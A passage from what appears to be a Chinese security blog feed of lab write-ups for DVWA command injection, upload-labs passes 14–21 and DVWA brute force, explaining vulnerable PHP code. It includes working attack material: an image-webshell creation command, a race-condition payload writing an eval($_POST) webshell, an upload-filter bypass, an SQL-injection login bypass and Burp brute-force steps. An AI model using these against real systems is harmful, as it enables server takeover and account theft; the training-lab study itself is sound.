str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Windows</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// *nix</span></span><br><span class="line">        $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>通过查看源码我们看到服务器对黑名单进行了补充，但是发现黑名单禁用的是<code>&#39;| &#39;</code>(这个里面有个空格)，而不是<code>&#39;|&#39;</code>，那么也就是说<code>|</code>命令指令符未被禁用。</p><h1 id="Impossible："><a href="#Impossible：" class="headerlink" title="Impossible："></a>Impossible：</h1><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_POST[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $target = $_REQUEST[ <span class="string">&#x27;ip&#x27;</span> ];</span><br><span class="line">    $target = stripslashes( $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Split the IP into 4 octects</span></span><br><span class="line">    $octet = explode( <span class="string">&quot;.&quot;</span>, $target );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check IF each octet is an integer</span></span><br><span class="line">    <span class="keyword">if</span>( ( is_numeric( $octet[<span class="number">0</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">1</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">2</span>] ) ) &amp;&amp; ( is_numeric( $octet[<span class="number">3</span>] ) ) &amp;&amp; ( sizeof( $octet ) == <span class="number">4</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// If all 4 octets are int&#x27;s put the IP back together.</span></span><br><span class="line">        $target = $octet[<span class="number">0</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">1</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">2</span>] . <span class="string">&#x27;.&#x27;</span> . $octet[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Determine OS and execute the ping command.</span></span><br><span class="line">        <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// Windows</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// *nix</span></span><br><span class="line">            $cmd = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . $target );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Ops. Let the user name theres a mistake</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;命令注入——利用可以调用系统命令的web应用，通过构造特殊命令字符串的方式，把恶意代码输入一个编辑域(例如缺乏有效验证的输入框)来改</summary>
      
    
    
    
    
    <category term="DVWA-labs" scheme="http://example.com/tags/DVWA-labs/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs-pass14-21</title>
    <link href="http://example.com/2021/02/20/upload-labs-pass14-21/"/>
    <id>http://example.com/2021/02/20/upload-labs-pass14-21/</id>
    <published>2021-02-20T04:27:30.000Z</published>
    <updated>2021-02-25T12:23:46.993Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从pass-14开始都是图片马搭配文件包含漏洞。</p><ul><li><strong>图片马的制作</strong></li></ul><p>使用cmd制作图片马：<strong>copy 1.jpg/b+1.php 2.jpg</strong>——意思是将1.jpg以二进制方式与1.php合并成2.jpg，这个2.jpg就是图片马了。</p><ul><li><strong>文件包含漏洞</strong></li></ul><p>-》文件包含简介：服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当作PHP来执行。</p><p>-》文件包含函数：PHP中文件包含函数有以下四种：</p><p>1.require()；2.require_once()；3.include()；4.include_once()</p><p><code>include</code>和<code>require</code>区别主要是，<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p>-》文件包含漏洞原理：文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码。</p><p>示例代码：</p><ol><li><pre><code class="php"> &lt;?php     $filename  = $_GET[&#39;filename&#39;];     include($filename); ?&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">参考资料：https:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395</span><br><span class="line"></span><br><span class="line"># pass-14：文件头检查绕过</span><br><span class="line"></span><br><span class="line">* 查看源码，发现服务器只检查文件内容的前两个字节</span><br><span class="line"></span><br><span class="line">补充：一般文件内容的前两个字节会体现出自己是什么类型的文件（可以用winhex查看）。</span><br><span class="line"></span><br><span class="line">因此本pass直接上传图片马即可绕过了。</span><br><span class="line"></span><br><span class="line">* 图片马的利用：</span><br><span class="line"></span><br><span class="line">  一般图片马是无法直接连接蚁剑的，那么我们可以搭配文件包含漏洞来操作服务器。点开pass-14注意2的文件包含漏洞网页，url栏输入：?file&#x3D;.&#x2F;upload&#x2F;文件名![2](upload-labs-pass14&#x2F;2.png)</span><br><span class="line"></span><br><span class="line"># pass-15：突破getimagesize()</span><br><span class="line"></span><br><span class="line">查看源码：</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;php</span><br><span class="line">if(file_exists($filename))&#123;</span><br><span class="line">        $info &#x3D; getimagesize($filename);</span><br><span class="line">        $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;根据索引2的值转换为对应后缀</span><br><span class="line">        if(stripos($types,$ext)&gt;&#x3D;0)&#123;</span><br><span class="line">            return $ext;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></code></pre></li></ol><ul><li><strong>新函数：</strong></li></ul><p>—）getimagesize()</p><p>功能：用于获取图像大小及相关信息，成功返回一个数组（成员为索引0、1、2、3等等），失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。</p><ol><li>索引 0 给出的是图像宽度的像素值</li><li>索引 1 给出的是图像高度的像素值</li><li>索引 2 给出的是图像的类型，返回的是数字，其中1 = GIF，2 = JPG，3 = PNG，4 = SWF，5 = PSD，6 = BMP，7 = TIFF(intel byte order)，8 = TIFF(motorola byte order)，9 = JPC，10 = JP2，11 = JPX，12 = JB2，13 = SWC，14 = IFF，15 = WBMP，16 = XBM</li><li>索引 3 给出的是一个宽度和高度的字符串，可以直接用于 HTML 的 &lt;image标签</li></ol><p>菜鸟教程实例：<img src="/2021/02/20/upload-labs-pass14-21/3.png" alt="3"></p><p>那么这关也是直接上传图片马即可绕过。</p><h1 id="pass-16：突破exif-imagetype"><a href="#pass-16：突破exif-imagetype" class="headerlink" title="pass-16：突破exif_imagetype()"></a>pass-16：突破exif_imagetype()</h1><ul><li><p>exif_imagetype()函数：</p><p>功能：读取一个图像的第一个字节并检查其签名。如果发现了恰当的签名则返回一个对应的常量，否则返回 FALSE。这个签名（也可以称为值）和 getimagesize() 返回的数组中的索引 2 的值是一样的，但本函数快得多。</p></li></ul><p><img src="/2021/02/20/upload-labs-pass14-21/4.png" alt="4"></p><p>那么这关也是直接上传图片马即可绕过。</p><h1 id="pass-17：二次渲染绕过"><a href="#pass-17：二次渲染绕过" class="headerlink" title="pass-17：二次渲染绕过"></a>pass-17：二次渲染绕过</h1><h1 id="pass-18：条件竞争——时间型"><a href="#pass-18：条件竞争——时间型" class="headerlink" title="pass-18：条件竞争——时间型"></a>pass-18：条件竞争——时间型</h1><ul><li>代码审计：服务器先上传了图片，再判断后缀是否符合，符合则重命名，不符合则删除。</li></ul><p>那么我们可以发现在我们上传了不符合的图片服务器保存到其删除肯定会有时间差的，那么我们就可以利用这一时间差进行我们的操作：上传新的一句话木马：</p><p>&lt; ?php fputs(fopen(‘shell.php’,’w’),’&lt; ?php @eval($_POST[“pass”])?&gt;’);?&gt;</p><ul><li><p>新函数：</p><p>—）<strong>fputs() 函数</strong>——别名fwrite</p><p>功能：写入文件（可安全用于二进制文件）</p><p>语法：fputs(file,string,length)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>file</td><td>必需。规定要写入的打开文件。</td></tr><tr><td>string</td><td>必需。规定要写入文件的字符串。</td></tr><tr><td>length</td><td>可选。规定要写入的最大字节数。</td></tr></tbody></table><p>—）<strong>fopen()函数</strong></p><p>功能：打开文件或者 URL。</p><p>语法：fopen(filename,mode,include_path,context)</p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>必需。规定要打开的文件或 URL。</td></tr><tr><td>mode</td><td>必需。规定要求到该文件/流的访问类型。可能的值见下表。</td></tr><tr><td>include_path</td><td>可选。如果也需要在 include_path 中检索文件的话，可以将该参数设为 1 或 TRUE。</td></tr><tr><td>context</td><td>可选。规定文件句柄的环境。Context 是可以修改流的行为的一套选项。</td></tr></tbody></table></li></ul><p>其中mode可选的类型有：</p><table><thead><tr><th align="left">mode</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">“r”</td><td align="left">只读方式打开，将文件指针指向文件头。</td></tr><tr><td align="left">“r+”</td><td align="left">读写方式打开，将文件指针指向文件头。</td></tr><tr><td align="left">“w”</td><td align="left">写入方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td></tr><tr><td align="left">“w+”</td><td align="left">读写方式打开，将文件指针指向文件头并将文件大小截为零。如果文件不存在则尝试创建之。</td></tr><tr><td align="left">“a”</td><td align="left">写入方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td></tr><tr><td align="left">“a+”</td><td align="left">读写方式打开，将文件指针指向文件末尾。如果文件不存在则尝试创建之。</td></tr><tr><td align="left">“x”</td><td align="left">创建并以写入方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。</td></tr><tr><td align="left">“x+”</td><td align="left">创建并以读写方式打开，将文件指针指向文件头。如果文件已存在，则 fopen() 调用失败并返回 FALSE，并生成一条 E_WARNING 级别的错误信息。如果文件不存在则尝试创建之。这和给底层的 open(2) 系统调用指定 O_EXCL|O_CREAT 标记是等价的。此选项被 PHP 4.3.2 以及以后的版本所支持，仅能用于本地文件。</td></tr></tbody></table><ul><li>把这个php文件通过burp一直不停的上传，总会有那么一瞬间是还没来得及删除就可以被访问到的（可以通过增加burpsuite线程来提高几率），一旦访问到该文件就会在当前目录下生成一个webshell2.0.php的一句话，然后用蚁剑连接shell.php即可。</li></ul><h1 id="pass-19：条件竞争"><a href="#pass-19：条件竞争" class="headerlink" title="pass-19：条件竞争"></a>pass-19：条件竞争</h1><h1 id="pass-20"><a href="#pass-20" class="headerlink" title="pass-20"></a>pass-20</h1><ul><li>代码审计：</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">       $is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">&#x27;禁止保存为该类型文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>新函数：</li></ul><p>—）<strong>pathinfo()函数</strong></p><p>功能：以数组的形式返回文件路径的信息</p><p>语法：pathinfo(path,process_sections)</p><table><thead><tr><th align="left">参数</th><th>描述</th></tr></thead><tbody><tr><td align="left">path</td><td>必需。规定要检查的路径。</td></tr><tr><td align="left">process_sections</td><td>可选。规定要返回的数组元素。默认是 all。可能的值：PATHINFO_DIRNAME - 只返回 dirname（目录路径）PATHINFO_BASENAME - 只返回 basename（文件名）PATHINFO_EXTENSION - 只返回 extension（文件名后缀）</td></tr></tbody></table><p>感觉这关就是前面的黑名单绕过，打组合拳就好了。</p><h1 id="pass-21"><a href="#pass-21" class="headerlink" title="pass-21"></a>pass-21</h1><ul><li><strong>代码审计：</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="literal">false</span>;</span><br><span class="line">$msg = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//检查MIME</span></span><br><span class="line">    $allow_type = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array($_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],$allow_type))&#123;</span><br><span class="line">        $msg = <span class="string">&quot;禁止上传该类型文件!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//检查文件名</span></span><br><span class="line">        $file = <span class="keyword">empty</span>($_POST[<span class="string">&#x27;save_name&#x27;</span>]) ? $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : $_POST[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(<span class="string">&#x27;.&#x27;</span>, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = <span class="string">&quot;禁止上传该后缀文件!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_name = reset($file) . <span class="string">&#x27;.&#x27;</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">            $temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">                $is_upload = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $msg = <span class="string">&quot;请选择要上传的文件！&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>新函数：</strong></li></ul><p>—）<strong>empty()函数</strong></p><p>功能：用于检查一个变量是否为空。</p><p>—）<strong>explode()函数</strong></p><p>功能：把字符串打散为数组。</p><p>语法：explode(separator,string,limit)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>separator</em></td><td align="left">必需。规定在哪里分割字符串。</td></tr><tr><td align="left"><em>string</em></td><td align="left">必需。要分割的字符串。</td></tr><tr><td align="left"><em>limit</em></td><td align="left">可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 <em>limit</em> 个元素的数组；小于 0 - 返回包含除了最后的 -<em>limit</em> 个元素以外的所有元素的数组；0 - 返回包含一个元素的数组</td></tr></tbody></table><p>—）<strong>is_array() 函数</strong></p><p>功能：用于检测变量是否是一个数组。</p><p>—）<strong>end()函数</strong></p><p>功能：将数组内部指针指向最后一个元素，并返回该元素的值（如果成功）。</p><p>语法：end(array)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>array</em></td><td align="left">必需。规定要使用的数组。</td></tr></tbody></table><p>相关的函数：</p><ol><li>current() - 返回数组中的当前元素的值</li><li>next() - 将内部指针指向数组中的下一个元素，并输出</li><li>prev() - 将内部指针指向数组中的上一个元素，并输出</li><li>reset()- 将内部指针指向数组中的第一个元素，并输出</li><li>each() - 返回当前元素的键名和键值，并将内部指针向前移动</li></ol><ul><li>我们可以看到服务器先对上传的图片进行了MIME检查，然后判断save_name参数是否为空，为空就把文件本来名称赋值给$file,否则就是将save_name参数的值赋给$file。接着判断$file是否是数组，如果不是数组则拆除数组，将数组的最后一个元素（也就是后缀）和允许上传文件后缀相比，若符合则取$file数组的第一个元素加<code>.</code>和$file的第二个元素作为新的文件名，并将图片文件上传到指定路径。</li><li>补充知识：对于像<code>.php/.</code>这样的文件路径，move_uploaded_file()函数会忽略掉文件末尾的<code>/.</code>。如此一来我们上传到服务器的文件还是被重命名为了php后缀。</li><li>那么这关我们的想法是：提前将save_name设置为数组，即令<code>save_name[0]=webshell.php/</code>、<code>save_name[2]=jpg</code>，其中save_name[1]的值为空。这样就可令<code>$file_name=webshell.php/.</code>。但是这边有个疑问，save_name数组的元素个数不是三个吗，$file[count($file) - 1]=$file[2]啊。但是其实我们只对数组赋值了两个元素，因此count的值为2，这就相当于你有3个口袋，但是只有两个口袋有钱。</li></ul><p>下面是实践：<img src="/2021/02/20/upload-labs-pass14-21/5-1614255649559.png" alt="5"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;从pass-14开始都是图片马搭配文件包含漏洞。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;图片马的制作&lt;/str</summary>
      
    
    
    
    
    <category term="upload-labs" scheme="http://example.com/tags/upload-labs/"/>
    
  </entry>
  
  <entry>
    <title>DVWA—Brute Force</title>
    <link href="http://example.com/2021/02/16/DVWA%E2%80%94Brute%20Force/"/>
    <id>http://example.com/2021/02/16/DVWA%E2%80%94Brute%20Force/</id>
    <published>2021-02-16T13:36:40.000Z</published>
    <updated>2021-03-03T14:43:56.806Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>该系列的实验主要围绕利用burpsuite的暴力破解。暴力破解，是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[ <span class="string">&#x27;username&#x27;</span> ];  </span><br><span class="line">$pass = $_GET[ <span class="string">&#x27;password&#x27;</span> ];   </span><br><span class="line">$pass = md5( $pass );   </span><br><span class="line">$query = <span class="string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="subst">$user</span>&#x27; AND password = &#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>; </span><br></pre></td></tr></table></figure><p>我们可以看到服务器对输入的账号密码没有做任何过滤处理，那么我们有两种方法：</p><p><strong>1)SQL注入</strong></p><p>输入username：admin’#，password：随便输。</p><p><strong>2)暴力破解</strong></p><p>输入目标账号和随意密码，抓包：</p><p>![1](DVWA—Brute Force/1.png)</p><p>send to intruder，清除标记，对希望爆破的值标记：![2](DVWA—Brute Force/2.png)</p><p>选择payload，载入字典：![3](DVWA—Brute Force/3.png)</p><p>start attack，我们可以看到当payload的值为password时回文的长度与众不同，因此我们得知用户admin的密码为password![4](DVWA—Brute Force/4.png)</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;Login&#x27;</span>]))&#123; </span><br><span class="line">$user=$_GET[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line">$user=mysql_real_escape_string($user); </span><br><span class="line">$pass=$_GET[<span class="string">&#x27;password&#x27;</span>]; </span><br><span class="line">$pass=mysql_real_escape_string($pass);</span><br><span class="line">$pass=md5($pass);</span><br><span class="line">$query=<span class="string">&quot;SELECT*FROM`users`WHEREuser=&#x27;<span class="subst">$user</span>&#x27;ANDpassword=&#x27;<span class="subst">$pass</span>&#x27;;&quot;</span>;</span><br></pre></td></tr></table></figure><p>我们看到服务器对账号密码都做了过滤处理，对一些敏感字符进行了转义。实战中如果目标服务器的MySQL数据库采用gbk编码，那么我们可以里用宽字节绕过，但是我这边数据库没有这么设置，因此我们用SQL注入是不大可能实现了，我们接着看源码发现绕过我们输入了错误的账号密码，服务器也只会延迟网页两秒而已，不算有效的防爆破机制。一次本关仍使用暴力破解，具体同上一关。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 